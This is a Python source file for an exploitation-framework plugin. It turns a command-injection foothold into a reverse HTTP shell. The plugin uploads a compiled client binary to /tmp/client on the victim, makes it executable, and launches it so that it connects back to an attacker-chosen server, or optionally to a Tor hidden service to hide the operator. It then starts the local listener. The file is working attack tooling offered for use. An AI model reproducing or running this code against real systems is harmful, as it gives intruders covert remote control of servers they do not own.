# 
# Copyright (c) 2010 Xavier Garcia  xavi.garcia@gmail.com
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
# 1. Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
# 3. Neither the name of copyright holders nor the names of its
#    contributors may be used to endorse or promote products derived
#    from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
# ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
# TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
# PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL COPYRIGHT HOLDERS OR CONTRIBUTORS
# BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.



from plugininterface import basePlugin
import os, os.path,time, sys


class reversehttp(basePlugin):

    server="127.0.0.1"
    port="8080"
    tor=False
    hidden_service=""

    def plugin_init(self):
        pass
        
    def plugin_loaded(self):
        pass
        
     
    def plugin_exploit_modes_requested(self, langClass, isSystem, isUnix):
        # This method will be called just befor the user gets the 'available attack' screen.
        # You can see that we get the 
        #     * langClass (which represents the current language of the script)
        #     * A boolean value 'isSystem' which tells us if we can inject system commands.
        #     * And another boolean 'isUnix' which will be true if it's a unix-like system and false if it's Windows.
        # We should return a array which contains tuples with a label and a unique callback string.
        ret = []

        #print "Language: " + langClass.getName()
        
        if (isSystem):
            attack = ("Loads a reverse HTTP shell", "reversehttp.reverse_http")
            ret.append(attack)
        
        return(ret)


    def request_parameters(self):
	mode=""
        while mode!="yes" and mode!="no":
		mode=raw_input("Enable Tor mode? [yes/no]: ").lower().strip("\n")
	if mode=="yes":
		self.tor=True
		self.hidden_service=raw_input("Hidden service name (Just Enter to use the hardcoded value)?: ").strip("\n")
		if self.hidden_service=="": print  "Using the default value"

	else:
		dest=raw_input("Destination server [%s]: " % self.server).strip("\n")
		if dest!="": self.server=dest
		dest_port=raw_input("Destination port [%s]: " % self.port).strip("\n")
		if dest_port!="": self.port=dest_port
		

	
        
    def plugin_callback_handler(self, callbackstring, haxhelper):
        # This function will be launched if the user selected one of your attacks.
        # The two params you receive here are:
        #    * callbackstring - The string you have defined in plugin_exploit_modes_requested.
        #    * haxhelper - A little class which makes it very easy to send an injected command.
        
        if (callbackstring == "reversehttp.reverse_http"):
            
            if (haxhelper.isUnix()):
		try:
		        pytor_path=os.environ['PYTOR_PATH']
		except KeyError:
			print "PYTOR_PATH env. variable is not set. I cannot continue"
			return 1
		os.chdir(pytor_path)
		if not os.path.isfile("./bin/client"):
			print "Client is not compiled yet..."
			time.sleep(5)
			if  os.system("make") != 0:
				print "Failed to compile"
				return 1

		self.request_parameters()

		print "Uploading client..."
		bytes = haxhelper.uploadfile("./bin/client", "/tmp/client", chunksize=1024)
		print "Uploaded %s bytes" % bytes
		haxhelper.executeSystemCommand("chmod 700 /tmp/client")

		if self.tor==True:
    			if self.hidden_service=="":
				env_string="TOR_MODE='yes'" 
			else:
				env_string="HIDDEN_SERVICE='%s' TOR_MODE='yes'" % (self.hidden_service)
		else:
			env_string="PYSERVER_IP='%s' PYSERVER_PORT='%s'" % (self.server,self.port)


		print " executing: %s  /tmp/client -c1 &" % (env_string)
		print haxhelper.executeSystemCommand("%s  /tmp/client -c 1 &" % (env_string))
		print "Running the server. Execute 'quit' to stop the client and then CTRL+C to stop the server :)"
		os.system("./bin/server")


            else:
		print "Platform not supported"
